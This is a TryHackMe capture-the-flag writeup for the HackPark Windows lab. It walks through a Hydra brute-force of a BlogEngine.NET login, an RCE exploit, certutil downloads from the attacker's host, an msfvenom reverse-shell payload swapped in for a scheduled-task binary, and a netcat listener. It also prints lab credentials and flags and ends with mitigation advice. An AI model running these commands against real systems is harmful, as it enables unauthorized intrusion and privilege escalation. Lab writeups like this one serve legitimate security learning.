---
layout: post
title: HackPark - TryHackMe Writeup
subtitle: A Step-by-Step Guide to Rooting the HackPark Machine
description: Learn how to brute-force a website login, exploit a public vulnerability, and escalate privileges on a Windows machine in this TryHackMe HackPark writeup.
image: https://tryhackme-images.s3.amazonaws.com/room-icons/8c8b2105d74035ca43531681439b457e.png
optimized_image: https://tryhackme-images.s3.amazonaws.com/room-icons/8c8b2105d74035ca43531681439b457e.png
category: tryhackme
tags:
  - TryHackMe
  - Hydra
  - BlogEngine.NET
  - Windows Privilege Escalation
  - Scheduled Tasks
  - WinPEAS
author: mustafa_altayeb
date: 2025-08-18 00:00:00 +0000
paginate: true
---

# HackPark - TryHackMe Writeup

[HackPark](https://tryhackme.com/room/hackpark) is a beginner-friendly Windows machine that teaches web application brute-forcing, exploit research, and Windows privilege escalation through scheduled task misconfigurations.

**Difficulty**: Medium ⭐⭐  
**Operating System**: Windows Server 2012 R2  
**Themes**: Web Brute-Forcing, BlogEngine Exploitation, Windows Privilege Escalation

---

## Objectives

1. Brute-force the web application login
2. Exploit BlogEngine.NET vulnerability for initial access
3. Enumerate Windows system for privilege escalation vectors
4. Escalate to Administrator via scheduled task exploitation

---

## Reconnaissance

### Nmap Scan

Started with a comprehensive scan (note: machine doesn't respond to ICMP):

```bash
nmap -Pn -T5 -sCV 10.10.19.138
```

**Results**:
```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: HackPark | HackPark Amusements
| http-robots.txt: 6 disallowed entries
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

**Key Findings**:
- **Port 80**: Web server running Microsoft IIS/8.5
- **Port 3389**: RDP service enabled
- **robots.txt**: Contains disallowed directories that might be sensitive

### Web Enumeration

The website on port 80 features a Pennywise theme and contains a login page:

![Pennywise Website](/assets/TryHackMeRoomsImage/HackPark/1.png)

Login page located at:
![Login Page](/assets/TryHackMeRoomsImage/HackPark/2.png)
![Login Form](/assets/TryHackMeRoomsImage/HackPark/3.png)

---

## Initial Access

### Brute-Force Attack with Hydra

Intercepted the login request with Burp Suite to analyze parameters:

![Burp Suite Capture](/assets/TryHackMeRoomsImage/HackPark/4.png)

**POST Request Analysis**:
- URL: `/Account/login.aspx?ReturnURL=%2fadmin%2f`
- Parameters: `__VIEWSTATE`, `txtUser`, `txtPass`, `btnLogin`
- Failure indicator: "Login Failed"

**Hydra Command**:
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.70.199 http-post-form "/Account/login.aspx?ReturnURL=%2fadmin%2f:__VIEWSTATE=...&txtUser=^USER^&txtPass=^PASS^&btnLogin=Login:Login Failed"
```

**Credentials Found**:
```
[80][http-post-form] host: 10.10.70.199   login: admin   password: 1qaz2wsx
```

### Admin Dashboard Access

Logged in with `admin:1qaz2wsx`:

![Admin Dashboard](/assets/TryHackMeRoomsImage/HackPark/5.png)

**System Information Discovered**:
```
BlogEngine.NET Specification
Version: 3.3.6.0
Configuration: Single blog
Trust level: Unrestricted
Identity: IIS APPPOOL\Blog
```

![About Section](/assets/TryHackMeRoomsImage/HackPark/6.png)

### Exploit Research

Found exploit for BlogEngine.NET 3.3.6.0:

**Exploit-DB**: [BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution](https://www.exploit-db.com/exploits/46353)

![Exploit Details](/assets/TryHackMeRoomsImage/HackPark/8.png)

### Exploitation Process

1. **Upload Malicious File**:  
   Accessed the post editor at `/admin/app/editor/editpost`
   ![Upload Interface](/assets/TryHackMeRoomsImage/HackPark/9.png)

2. **Trigger Exploit**:  
   Accessed the vulnerable endpoint:
   ```
   http://10.10.70.199/?theme=../../App_Data/files
   ```

3. **Reverse Shell Obtained**:
   ![Reverse Shell](/assets/TryHackMeRoomsImage/HackPark/7.png)

---

## Privilege Escalation

### System Information

```cmd
systeminfo
```

**Key Details**:
- OS: Windows Server 2012 R2 Standard (6.3.9600)
- Architecture: x64-based PC
- Hotfixes installed (indicating some updates applied)

### WinPEAS Enumeration

1. **Download WinPEAS**:
   ```cmd
   certutil.exe -urlcache -f http://10.11.145.45:3000/winPEASx64.exe winPEASx64.exe
   ```

2. **Run WinPEAS**:
   ```cmd
   .\winPEASx64.exe
   ```

**Critical Findings**:

1. **AutoLogon Credentials**:
   ```
   DefaultUserName: administrator
   DefaultPassword: 4q6XvFES7Fdxs
   ```

2. **Vulnerable Scheduled Task**:
   ```
   WindowsScheduler (Splinterware Software Solutions - System Scheduler Service)
   Location: C:\PROGRA~2\SYSTEM~1\WService.exe
   Status: Auto - Running
   File Permissions: Everyone [Allow: WriteData/CreateFiles]
   Possible DLL Hijacking in binary folder
   ```

### Scheduled Task Analysis

Navigated to SystemScheduler directory:
```cmd
cd "C:\Program Files (x86)\SystemScheduler"
dir
```

**Discovered**: `Message.exe` executable

**Event Log Analysis**:
```cmd
cd Events
more 20198415519.INI_LOG.txt
```

**Log Content**:
```
08/04/19 15:06:01,Event Started Ok, (Administrator)
08/04/19 15:06:30,Process Ended. PID:2608,ExitCode:1,Message.exe (Administrator)
```

**Key Insight**: `Message.exe` runs every 30 seconds as Administrator

### Exploitation Strategy

1. **Generate Reverse Shell Payload**:
   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.145.45 LPORT=8888 -f exe > Message.exe
   ```

2. **Transfer Payload to Target**:
   ```cmd
   certutil.exe -urlcache -f http://10.11.145.45:8000/Message.exe Message.exe
   ```

3. **Wait for Execution**:  
   The scheduled task automatically executes the malicious `Message.exe`

4. **Receive Reverse Shell**:
   ```bash
   # On attacker machine
   nc -nlvp 8888
   
   # Connection received
   Microsoft Windows [Version 6.3.9600]
   C:\PROGRA~2\SYSTEM~1>
   ```

### Flag Capture

**User Flag (jeff)**:
```cmd
C:\Users\jeff\Desktop>type user.txt
759bd8af507517bcfaede78a21a73e39
```

**Root Flag (Administrator)**:
```cmd
C:\Users\Administrator\Desktop>type root.txt
7e13d97f05f7ceb9881a3eb3d78d3e72
```

**Alternative Authentication**:  
Could also use discovered AutoLogon credentials:
- Username: `administrator`
- Password: `4q6XvFES7Fdxs`

---

## Key Takeaways

### Attack Path Summary:
```
Port Scanning → Web Enumeration → Hydra Brute-Force → 
BlogEngine.NET RCE → Initial Shell → WinPEAS Enumeration → 
Scheduled Task Analysis → Binary Replacement → Administrator Shell
```

### Vulnerabilities Exploited:
1. **Weak Credentials** - Predictable admin password
2. **BlogEngine.NET RCE** - CVE-2019-6714 (Directory Traversal/File Upload)
3. **Scheduled Task Misconfiguration** - World-writable executable directory
4. **AutoLogon Credentials** - Clear-text credentials in registry

### Mitigation Strategies:
1. **For Web Applications**:
   - Implement strong password policies
   - Enable account lockout mechanisms
   - Regular software updates
   - Input validation and sanitization

2. **For Windows Security**:
   - Principle of least privilege for file permissions
   - Regular scheduled task audits
   - Disable AutoLogon or use encrypted credentials
   - Implement AppLocker or similar application whitelisting

3. **For Network Security**:
   - Network segmentation
   - Regular vulnerability assessments
   - Security monitoring and logging

### Tools Used:
- **Nmap** - Network reconnaissance
- **Hydra** - Password brute-forcing
- **Burp Suite** - Web traffic analysis
- **WinPEAS** - Windows privilege escalation enumeration
- **Metasploit** - Payload generation
- **Certutil** - File transfer on Windows
- **Netcat** - Reverse shell handling

---

<iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=3186403" style="border:none;"></iframe>

**Find me online**:  
• TryHackMe: [t4t4r1s](https://tryhackme.com/p/t4t4r1s)  
• LinkedIn: [Mustafa Altayeb](https://www.linkedin.com/in/t4t4r1s)  
• X: [@mustafa_altayeb](https://x.com/t4t4r1s)

---
